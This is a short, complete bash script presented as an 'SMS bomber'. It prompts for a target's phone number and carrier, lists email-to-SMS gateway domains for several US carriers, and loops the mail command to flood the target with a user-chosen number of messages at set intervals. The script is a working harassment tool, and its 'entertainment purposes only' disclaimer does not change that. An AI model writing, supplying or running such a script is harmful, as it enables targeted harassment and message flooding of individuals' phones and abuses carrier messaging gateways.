#!/bin/bash
###############################################
# TXT-b0mbr                                   #
# SMS BOMBER by Josh Bray                     #
# joshbray.net                                #
# Version: 1.0                                #
# Instructions:                               #
# nano bombr                                  #
# 'paste code' and save                       #
# chmod 755 bombr                             #
# To Run:                                     #
# ./bombr                                     #
###############################################
#               USE AT OWN RISK               #
#         Entertainment Purposes Only         #
# Author is not responsible for use of others #
###############################################
# defines colors
txtred=$(tput setaf 1)    # Red
txtgrn=$(tput setaf 2)    # Green
txtylw=$(tput setaf 3)    # Yellow
txtcyn=$(tput setaf 6)    # Cyan
txtrst=$(tput sgr0)       # Text reset
# start
clear
# launch interface
echo "${txtylw}Launching b0mbr...${txtrst}"
sleep 1
echo
echo "${txtylw}=====================================${txtrst}"
echo "${txtred} \ / \ / \ / \ / \ / \ / \ / \ / \ / ${txtrst}"
echo "${txtred}  |   |   |   |   |   |   |   |   |  ${txtrst}"
echo "${txtred} / \ / \ / \ / \ / \ / \ / \ / \ / \ ${txtrst}"
echo "${txtred}( T | X | T | - | b | 0 | m | b | r )${txtrst}"
echo "${txtred} \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ ${txtrst}"
echo "${txtylw}=========== joshbray.net ============${txtrst}"
sleep 1
echo
# display menu
echo "${txtylw}Carrier Addresses:${txtrst}"
echo "============================================="
echo "==== Carrier ====|==== Address =============="
echo "= AT&T           | txt.att.net              ="
echo "= Cingular       | cingularme.com           ="
echo "= Nextel         | messaging.nextel.com     ="
echo "= Sprint         | messaging.sprintpcs.com  ="
echo "= T-Mobile       | tmomail.net              ="
echo "= Verizon        | vtext.com                ="
echo "= Virgin Mobile  | vmobl.com                ="
echo "============================================="
echo
# start interaction
echo -n "${txtylw}Target's Phone # (1234567890): ${txtrst}"
read phone
echo -n "${txtylw}Target's Carrier Address (domain.tld): ${txtrst}"
read carrier
echo -n "${txtylw}Number of Bombs: ${txtrst}"
read num
echo -n "${txtylw}Time in Seconds Between Bombs (recommended at least 2): ${txtrst}"
read time
echo -n "${txtylw}Subject: ${txtrst}"
read sub
echo -n "${txtylw}Content: ${txtrst}"
read body
echo
# start timer
T="$(date +%s)"
# start bombing run
echo "${txtylw}Delivering $num payloads to target $phone@$carrier every $time seconds...${txtrst}"
for (( c=1; c<=$num; c++ ))
  do
     mail -s "$sub" $phone@$carrier <<< "$body"
         echo "${txtred}$c bombs dropped.${txtrst}"
         echo | sleep $time
done
# outro
echo | echo "${txtgrn}Payloads delivered.${txtrst}"
# timer stop
T="$(($(date +%s)-T))"
sleep 1
echo
#display runtime
echo "${txtylw}b0mbr run lasted ${T} seconds.${txtrst}"
